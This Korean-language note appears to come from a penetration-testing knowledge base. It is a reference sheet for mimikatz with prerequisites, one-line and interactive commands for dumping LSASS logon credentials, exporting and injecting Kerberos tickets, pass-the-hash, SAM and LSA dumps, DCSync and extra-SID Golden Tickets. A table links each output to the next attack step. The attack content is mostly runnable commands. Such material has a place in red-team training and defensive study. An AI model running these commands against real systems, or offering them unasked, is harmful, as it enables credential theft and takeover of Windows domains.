---
tags:
  - 환경/windows
  - 기능/자격증명수집
실행환경: ["Windows"]
필요권한: ["LSASS·SAM·LSA 접근 시 관리자 또는 SYSTEM 권한"]
필요조건: ["대상 architecture에 맞는 mimikatz executable"]
결과: ["자격증명", "해시", "티켓"]
---

# mimikatz

## 도구 개요

Mimikatz는 Windows의 LSASS·SAM·LSA·DPAPI 자료에서 자격 증명과 Kerberos ticket을 추출하고, hash·ticket 재사용과 DCSync 같은 인증 작업을 수행하는 모듈형 도구다. 라이브 Windows 세션에서 여러 자격 증명 저장소와 인증 방식을 다룰 때 사용하며 모듈마다 필요한 권한과 보호 기능의 영향이 다르다.

## 필요한 입력과 실행 환경

- 실행 위치: 대상 architecture에 맞는 Mimikatz를 실행할 수 있는 Windows 세션
- 권한 조건: LSASS/SAM/LSA 접근은 보통 로컬 관리자, SeDebugPrivilege 또는 SYSTEM 권한이 필요하다.
- 명령별 입력: Kerberos ticket 파일, NTLM hash, 도메인·사용자, DPAPI blob·master key 등 선택한 module이 요구하는 정확한 인증 자료
- 환경 조건: Windows build, LSASS PPL, Credential Guard와 보안 제품에 따라 명령 지원과 출력이 달라질 수 있다.


## 표준 사용법

Windows 셸에서 실행한 뒤 `mimikatz #` 프롬프트 안에서 모듈 명령을 입력한다.

```cmd
mimikatz.exe
mimikatz # privilege::debug

mimikatz # sekurlsa::logonpasswords

mimikatz # exit

```

원라인 실행도 가능하다.

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

`privilege::debug`는 SeDebugPrivilege를 활성화하는 명령이고, LSASS 접근이나 일부 덤프 기능은 보통 관리자 권한이 필요하다.

## 대표 예시

### 디버그 권한 활성화

```cmd
mimikatz # privilege::debug

```

성공하면 `Privilege '20' OK`가 표시된다. 이후 `sekurlsa` 계열 명령을 실행하기 위한 기본 준비 단계로 자주 쓴다.

### LSASS 로그온 세션 자격 증명 확인

```cmd
mimikatz # sekurlsa::logonpasswords

```

현재 시스템의 로그온 세션에서 NTLM, SHA1, Kerberos 관련 정보를 확인한다. 최신 Windows에서는 평문 비밀번호가 나오지 않는 경우가 많다.

### Kerberos 키 확인

```cmd
mimikatz # sekurlsa::ekeys

```

로그온 세션에 남아 있는 Kerberos 암호화 키를 확인한다. PtK/Overpass-the-Hash 계열 검토에 사용된다.

### Kerberos 티켓 내보내기

```cmd
mimikatz # sekurlsa::tickets /export

```

현재 세션의 Kerberos 티켓을 `.kirbi` 파일로 저장한다. 저장된 티켓은 Pass the Ticket에서 사용할 수 있다.


## 주요 옵션과 명령

| 명령 | 의미 |
| --- | --- |
| `privilege::debug` | SeDebugPrivilege 활성화 |
| `sekurlsa::logonpasswords` | LSASS 로그온 세션 자격 증명 확인 |
| `sekurlsa::ekeys` | Kerberos 키 확인 |
| `sekurlsa::tickets /export` | Kerberos 티켓 내보내기 |
| `kerberos::ptt <ticket.kirbi>` | Kerberos 티켓 주입 |
| `sekurlsa::pth ...` | Pass the Hash/Overpass 계열 새 프로세스 생성 |
| `token::elevate` | 가능한 경우 SYSTEM 토큰으로 상승 |
| `lsadump::sam` | 로컬 SAM 해시 덤프 |
| `lsadump::lsa /patch` | LSA secret 확인 |
| `lsadump::dcsync ...` | AD 복제 프로토콜을 이용한 계정 해시 요청 |
| `kerberos::golden ... /sids:<SID> /ptt` | 추가 SID가 포함된 Golden Ticket 생성과 현재 세션 주입 |
| `vault::cred` | Credential Manager/Vault 항목 확인 |
| `dpapi::cred`/`dpapi::masterkey` | DPAPI 보호 자격 증명과 masterkey 처리 |
| `exit` | mimikatz 종료 |

## 도구 고유 출력

| 출력/상태 | 의미 | 다음 행동 |
|---|---|---|
| `Privilege '20' OK` | SeDebugPrivilege 활성화 성공 | `sekurlsa` 계열 명령으로 LSASS 접근 시도 |
| 계정명이 연결된 NTLM hash·Kerberos key·ticket 출력 | hash·key·ticket 종류별 인증 후보 확보 | hash는 Pass the Hash·cracking, key는 새 TGT 요청, ticket은 Pass the Ticket 가능성을 각각 확인 |
| `SAM Username`과 `Hash NTLM` | 지정 계정 DCSync 성공 | 요청한 계정과 현재 복제 권한 범위 확인 |
| `ERROR kuhl_m_sekurlsa_acquireLSA` / access denied | LSASS 접근 실패 | 관리자 권한, PPL, Credential Guard, AV/EDR 확인 |
| `kerberos::ptt` 성공 | ticket 주입 완료 | `klist`, SMB/HTTP/LDAP 접근으로 실제 인증 확인 |
| debug 권한 실패 | 관리자 권한 아님 또는 특권 부족 | 관리자 세션, `whoami /priv`, UAC 상태 확인 |
| 평문 비밀번호 없음 | 최신 Windows 기본 동작 | NTLM, Kerberos key, DPAPI 단서 중심으로 판단 |
| ticket 사용 실패 | SPN/realm/시간 문제 | `klist`, 시간 동기화, 대상 서비스 SPN 확인 |
| `Extra SIDs`와 Golden Ticket 제출 성공 | 추가 SID가 포함된 ticket 생성·주입 | 부모 도메인 대상 서비스와 DCSync에서 실제 권한 확인 |

## 관련 공격기법

- [[LSASS 메모리 덤프]]
- [[Windows SAM SECURITY SYSTEM 덤프]]
- [[Windows 저장 자격증명 수집]]
- [[OverPass the Hash]]
- [[Pass the Hash]]
- [[Pass the Ticket]]
- [[DCSync]]
- [[자식 도메인 ExtraSids Golden Ticket]]

## 참고 링크

- [gentilkiwi Mimikatz: lsadump module](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump)
- [gentilkiwi Mimikatz: sekurlsa module](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa)
